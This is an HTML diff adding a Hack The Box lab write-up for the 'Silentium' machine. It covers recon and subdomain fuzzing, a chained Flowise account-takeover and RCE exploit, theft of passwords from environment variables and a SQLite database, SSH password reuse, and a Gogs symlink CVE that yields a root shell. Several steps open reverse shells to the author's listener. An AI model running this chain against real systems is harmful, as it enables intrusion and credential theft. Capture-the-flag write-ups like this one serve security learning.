@@ -1,0 +1,192 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Silentium | shreekara@sec</title>
+<meta name="description" content="HTB Silentium: Flowise RCE chain, environment variable credential leak, Gogs CVE privesc to root.">
+<link rel="icon" type="image/png" href="../../assets/img/favicon-32.png">
+<link rel="apple-touch-icon" href="../../assets/img/apple-touch-icon.png">
+<meta property="og:title" content="Silentium | shreekara@sec">
+<meta property="og:description" content="HTB Silentium: Flowise RCE chain, environment variable credential leak, Gogs CVE privesc to root.">
+<meta property="og:type" content="website">
+<meta property="og:url" content="https://sneakyyy.site/writeups/silentium/index.html">
+<meta property="og:image" content="../../assets/img/splash2.jpg">
+<meta name="twitter:card" content="summary_large_image">
+<link rel="preconnect" href="https://fonts.googleapis.com">
+<link href="https://fonts.googleapis.com/css2?family=JetBrains+Mono:wght@300;400;500;700&display=swap" rel="stylesheet">
+<link rel="stylesheet" href="../../assets/css/style.css">
+</head>
+<body>
+<div class="site">
+<main>
+<div class="prompt-l"><span class="u">shreekara</span>@<span class="h">sneaky69</span>:~/writeups/silentium$</div>
+
+<nav class="path-nav">
+  <a href="../../index.html"><span class="tilde">~/</span>home</a>
+  <a href="../../about/index.html"><span class="tilde">~/</span>about</a>
+  <a href="../../writeups/index.html" class="active"><span class="tilde">~/</span>writeups</a>
+  <a href="../../projects/index.html"><span class="tilde">~/</span>projects</a>
+</nav>
+
+<div class="cmd"><div class="cmd-line"><span class="d">$</span><span class="c">cat</span><span class="a">silentium.md</span></div></div>
+
+<h1 style="color:var(--white);font-size:20px;margin-bottom:0.6rem;">HTB Write-Up: Silentium</h1>
+
+<table class="ptable">
+  <tr><td>Platform</td><td>Hack The Box</td></tr>
+  <tr><td>Difficulty</td><td><span class="badge med">Medium</span></td></tr>
+  <tr><td>OS</td><td>Linux</td></tr>
+  <tr><td>Author</td><td>shreekara</td></tr>
+  <tr><td>Date</td><td>May 30, 2026</td></tr>
+  <tr><td>Source</td><td><a href="https://github.com/ShreekaraKedlaya/Hackthebox-writeups/blob/main/silentium.md" target="_blank">github.com/ShreekaraKedlaya/Hackthebox-writeups</a></td></tr>
+</table>
+
+<hr class="sep">
+
+<p class="section-lbl">Table of Contents</p>
+<pre class="cb">1. Reconnaissance
+2. Enumeration — Subdomain Discovery &amp; Flowise Fingerprinting
+3. Initial Access — CVE-2025-58434 &amp; CVE-2025-59528 (Flowise RCE)
+4. Lateral Movement — Credential Extraction &amp; SSH Access
+5. Privilege Escalation — Gogs CVE-2025-8110 (RCE as Root)
+6. Summary &amp; Takeaways</pre>
+
+<hr class="sep">
+
+<p class="section-lbl">1. Reconnaissance</p>
+<p>Target: <code style="color:var(--cyan);">10.129.6.254</code>. Started with the usual full scan:</p>
+<div class="cmd"><div class="cmd-line"><span class="d">$</span><span class="c">sudo nmap</span><span class="a">-sV -sC -O -T4 10.129.6.254</span></div></div>
+<table class="ptable">
+  <tr><td>Port</td><td>Service</td><td style="color:var(--fg);">Details</td></tr>
+  <tr><td>22</td><td>SSH</td><td style="color:var(--fg);">OpenSSH 9.6p1 (Ubuntu)</td></tr>
+  <tr><td>80</td><td>HTTP</td><td style="color:var(--fg);">nginx 1.24.0 — redirects to silentium.htb</td></tr>
+</table>
+<p>Two ports, and the HTTP one didn't even try to hide where it wanted to send me. Added the hostname straight away:</p>
+<div class="cmd"><div class="cmd-line"><span class="d">$</span><span class="c">echo</span><span class="a">"10.129.6.254 silentium.htb" | sudo tee -a /etc/hosts</span></div></div>
+
+<hr class="sep">
+
+<p class="section-lbl">2. Enumeration — Subdomain Discovery &amp; Flowise Fingerprinting</p>
+
+<p style="color:var(--white);font-weight:700;margin-top:1rem;">2.1 — Web Application</p>
+<p>The main site is a basic financial institution landing page. The Institutional Leadership section leaks a handful of names — worth keeping around as potential usernames later. Nothing else stood out, so I ran directory enumeration:</p>
+<div class="cmd"><div class="cmd-line"><span class="d">$</span><span class="c">gobuster dir</span><span class="a">-u http://silentium.htb -w directory-list-2.3-medium.txt</span></div></div>
+<p>Hit a soft-404 problem &mdash; the server returns 200 for everything with a body size of 8753. Excluded that and re-ran, still nothing useful. Pivoted to subdomain fuzzing instead. First checked the baseline response size for a subdomain that shouldn't exist:</p>
+<div class="cmd"><div class="cmd-line"><span class="d">$</span><span class="c">curl</span><span class="a">-I -H "Host: this-does-not-exist.silentium.htb" http://silentium.htb</span></div></div>
+<p>Default size came back as 178. Used that to filter ffuf:</p>
+<div class="cmd"><div class="cmd-line"><span class="d">$</span><span class="c">ffuf</span><span class="a">-w subdomains-top1million-110000.txt -u http://silentium.htb -H "Host: FUZZ.silentium.htb" -fs 178</span></div></div>
+<p>One subdomain came back: <code style="color:var(--cyan);">staging</code>. Added it to <code style="color:var(--cyan);">/etc/hosts</code> and went to look.</p>
+
+<p style="color:var(--white);font-weight:700;margin-top:1rem;">2.2 — staging.silentium.htb</p>
+<p>A login form, no registration option. The forgot-password feature responds differently depending on whether the email exists or not &mdash; a classic user enumeration bug. Tried the names pulled from the leadership section with <code style="color:var(--cyan);">@silentium.htb</code>, and <code style="color:var(--cyan);">ben@silentium.htb</code> came back valid.</p>
+
+<p style="color:var(--white);font-weight:700;margin-top:1rem;">2.3 — Identifying Flowise</p>
+<p>Hit the login endpoint directly to grab response headers:</p>
+<div class="cmd"><div class="cmd-line"><span class="d">$</span><span class="c">curl</span><span class="a">-s -X POST http://staging.silentium.htb/login -d '{"email":"ben@silentium.htb","password":"wrong"}' -v</span></div></div>
+<p>The response title gave it away: <strong style="color:var(--white);">Flowise</strong>, an open-source AI agent builder. Grabbed the version from its API:</p>
+<div class="cmd"><div class="cmd-line"><span class="d">$</span><span class="c">curl</span><span class="a">http://staging.silentium.htb/api/v1/version</span></div>
+  <div class="cmd-out">Flowise 3.0.5</div>
+</div>
+<p>Time to go looking for CVEs against that version.</p>
+
+<hr class="sep">
+
+<p class="section-lbl">3. Initial Access — CVE-2025-58434 &amp; CVE-2025-59528 (Flowise RCE)</p>
+
+<p style="color:var(--white);font-weight:700;margin-top:1rem;">3.1 — Two CVEs That Chain Together</p>
+<p>Flowise 3.0.5 is hit by two separate CVEs that combine nicely: <strong style="color:var(--red2);">CVE-2025-58434</strong>, an unauthenticated account takeover, and <strong style="color:var(--red2);">CVE-2025-59528</strong>, an authenticated RCE via JavaScript injection into the <code style="color:var(--cyan);">mcpserverconfig</code> parameter of the CustomMCP node. The first gets you auth, the second gets you a shell.</p>
+
+<p style="color:var(--white);font-weight:700;margin-top:1rem;">3.2 — Exploitation</p>
+<p>Found a public PoC that chains both CVEs together:</p>
+<div class="cmd"><div class="cmd-line"><span class="d">$</span><span class="c">git clone</span><span class="a">CVE-2025-58434-AND-59528-POC.git</span></div></div>
+<div class="cmd"><div class="cmd-line"><span class="d">$</span><span class="c">nc</span><span class="a">-lvnp 4444</span></div></div>
+<div class="cmd"><div class="cmd-line"><span class="d">$</span><span class="c">python3</span><span class="a">main.py -u http://staging.silentium.htb -e ben@silentium.htb --lhost 10.10.16.194 --lport 4444</span></div>
+  <div class="cmd-out">Shell landed. Running as <code style="color:var(--cyan);">node</code>.</div>
+</div>
+
+<hr class="sep">
+
+<p class="section-lbl">4. Lateral Movement — Credential Extraction &amp; SSH Access</p>
+
+<p style="color:var(--white);font-weight:700;margin-top:1rem;">4.1 — Exploring the Filesystem</p>
+<p>Nothing in <code style="color:var(--cyan);">/home/node</code>, but a directory at the root level caught my eye:</p>
+<div class="cmd"><div class="cmd-line"><span class="d">$</span><span class="c">ls</span><span class="a">/root/.flowise</span></div>
+  <div class="cmd-out">database.sqlite &middot; encryption.key &middot; uploads/</div>
+</div>
+<div class="cmd"><div class="cmd-line"><span class="d">$</span><span class="c">sqlite3</span><span class="a">/root/.flowise/database.sqlite ".tables"</span></div></div>
+<p>Pulled the users table &mdash; ben's bcrypt hash plus an API key came back. Kicked off hashcat while continuing to poke around:</p>
+<div class="cmd"><div class="cmd-line"><span class="d">$</span><span class="c">hashcat</span><span class="a">-m 3200 hash.txt rockyou.txt</span></div></div>
+
+<p style="color:var(--white);font-weight:700;margin-top:1rem;">4.2 — Environment Variables</p>
+<p>While hashcat chewed on the hash in the background, checked <code style="color:var(--cyan);">env</code> and two passwords jumped out immediately:</p>
+<pre class="cb">FLOWISE_PASSWORD=F1l3_d0ck3r
+SMTP_PASSWORD=r04D!!_R4ge</pre>
+<p>Tried <code style="color:var(--cyan);">F1l3_d0ck3r</code> on SSH and on staging login &mdash; no luck either way. Nmap hadn't shown SMTP exposed externally, so the SMTP password looked like a strong candidate for reuse elsewhere.</p>
+
+<p style="color:var(--white);font-weight:700;margin-top:1rem;">4.3 — SSH as ben</p>
+<div class="cmd"><div class="cmd-line"><span class="d">$</span><span class="c">ssh</span><span class="a">ben@10.129.6.254</span></div>
+  <div class="cmd-out">Password: r04D!!_R4ge &middot; logged in without issue.</div>
+</div>
+<p>User flag at <code style="color:var(--cyan);">/home/ben/user.txt</code>.</p>
+
+<hr class="sep">
+
+<p class="section-lbl">5. Privilege Escalation — Gogs CVE-2025-8110 (RCE as Root)</p>
+
+<p style="color:var(--white);font-weight:700;margin-top:1rem;">5.1 — Internal Port Enumeration</p>
+<div class="cmd"><div class="cmd-line"><span class="d">$</span><span class="c">ss</span><span class="a">-tlnp</span></div></div>
+<p>Curled the internal-only ports to fingerprint them. Port 3001 returned HTML with Gogs metadata &mdash; a self-hosted Git service &mdash; and the <code style="color:var(--cyan);">og:url</code> tag leaked the internal hostname: <code style="color:var(--cyan);">staging-v2-code.dev.silentium.htb:3001</code>. Port 8025 turned out to be Mailhog's web UI, nothing useful there.</p>
+
+<p style="color:var(--white);font-weight:700;margin-top:1rem;">5.2 — Accessing Gogs</p>
+<div class="cmd"><div class="cmd-line"><span class="d">$</span><span class="c">ssh</span><span class="a">-L 3001:127.0.0.1:3001 ben@10.129.6.254</span></div></div>
+<p>Ben's listed as a Gogs user but none of the known passwords worked, and forgot-password is disabled. Registered a throwaway account to keep looking &mdash; no public repos visible anywhere.</p>
+
+<p style="color:var(--white);font-weight:700;margin-top:1rem;">5.3 — Gogs Config &amp; Version</p>
+<div class="cmd"><div class="cmd-line"><span class="d">$</span><span class="c">cat</span><span class="a">/opt/gogs/gogs/custom/conf/app.ini</span></div>
+  <div class="cmd-out">RUN_USER = root<br>SECRET_KEY = sdsrcxSm0iC7wDO</div>
+</div>
+<p>Gogs running as root &mdash; any RCE through it is a direct line to root. Checked the version:</p>
+<div class="cmd"><div class="cmd-line"><span class="d">$</span><span class="c">/opt/gogs/gogs/gogs</span><span class="a">--version</span></div>
+  <div class="cmd-out">Gogs 0.13.3 &mdash; vulnerable to CVE-2025-8110</div>
+</div>
+
+<p style="color:var(--white);font-weight:700;margin-top:1rem;">5.4 — CVE-2025-8110 (Gogs RCE)</p>
+<p>This one works by creating a repo with a malicious symlink pointing at <code style="color:var(--cyan);">.git/config</code>, then overwriting it via the API with a malicious <code style="color:var(--cyan);">sshCommand</code> payload. When Gogs processes the repo over SSH, it executes the command. Used a modified PoC that skips registration entirely (captcha's enabled) and reuses the dummy account instead:</p>
+<div class="cmd"><div class="cmd-line"><span class="d">$</span><span class="c">nc</span><span class="a">-lvnp 9001</span></div></div>
+<div class="cmd"><div class="cmd-line"><span class="d">$</span><span class="c">python3</span><span class="a">CVE-2025-8110.py -u http://127.0.0.1:3001 -lh 10.10.16.194 -lp 9001 -un &lt;dummy&gt; -pw &lt;dummy&gt;</span></div>
+  <div class="cmd-out">Shell came back as root.</div>
+</div>
+<p>Root flag at <code style="color:var(--cyan);">/root/root.txt</code>.</p>
+
+<hr class="sep">
+
+<p class="section-lbl">6. Summary &amp; Takeaways</p>
+<p style="color:var(--white);font-weight:700;margin-top:1rem;">Attack Chain</p>
+<table class="ptable">
+  <tr><td>Phase</td><td>Technique</td><td style="color:var(--fg);">Result</td></tr>
+  <tr><td>Recon</td><td>nmap -sV -sC</td><td style="color:var(--fg);">Ports 22, 80 &rarr; nginx redirect</td></tr>
+  <tr><td>Enumeration</td><td>ffuf subdomain fuzzing</td><td style="color:var(--fg);">staging.silentium.htb found</td></tr>
+  <tr><td>Fingerprinting</td><td>Response headers + /api/v1/version</td><td style="color:var(--fg);">Flowise 3.0.5 identified</td></tr>
+  <tr><td>Initial Access</td><td>CVE-2025-58434 + CVE-2025-59528 chained</td><td style="color:var(--fg);">Shell as node</td></tr>
+  <tr><td>Credential Extraction</td><td>SQLite DB + env dump</td><td style="color:var(--fg);">SMTP_PASSWORD reused for SSH</td></tr>
+  <tr><td>Lateral Movement</td><td>SSH password reuse</td><td style="color:var(--fg);">Shell as ben + user flag</td></tr>
+  <tr><td>Internal Recon</td><td>ss -tlnp + curl internal ports</td><td style="color:var(--fg);">Gogs on 3001, running as root</td></tr>
+  <tr><td>Privilege Escalation</td><td>CVE-2025-8110 via SSH tunnel + dummy account</td><td style="color:var(--fg);">Root shell + root flag</td></tr>
+</table>
+
+<p style="color:var(--white);font-weight:700;margin-top:1.2rem;">What I Took Away From This Box</p>
+<p style="margin-top:0.6rem;">The main domain was a dead end on purpose, and everything real was sitting on a subdomain I only found by fuzzing. I almost stopped after the directory brute-force came up empty &mdash; worth remembering that a quiet root domain doesn't mean a quiet target.</p>
+<p style="margin-top:0.6rem;">The forgot-password oracle handing me a confirmed username for free was a nice reminder that verbose auth error handling is still a common miss, even on things that look otherwise solid. And the <code style="color:var(--cyan);">env</code> dump giving up two plaintext passwords was almost too easy &mdash; one of them just happened to be reused on SSH.</p>
+<p style="margin-top:0.6rem;">The real lesson was at the end though: once I had a low-priv shell and found Gogs internally with <code style="color:var(--cyan);">RUN_USER = root</code> sitting in its config, it was just a matter of matching the version to a CVE. Any internal service running as root turns a foothold into a root shell the moment there's a public exploit for it.</p>
+
+<a class="back-link" href="../../writeups/index.html">&lt; cd ~/writeups</a>
+
+</main>
+<footer>
+  <span>shreekara // security researcher</span>
+  <span><a href="../../writeups/index.html">writeups</a> · <a href="https://github.com/ShreekaraKedlaya" target="_blank">github</a></span>
+</footer>
+</div>
+</body>
+</html>
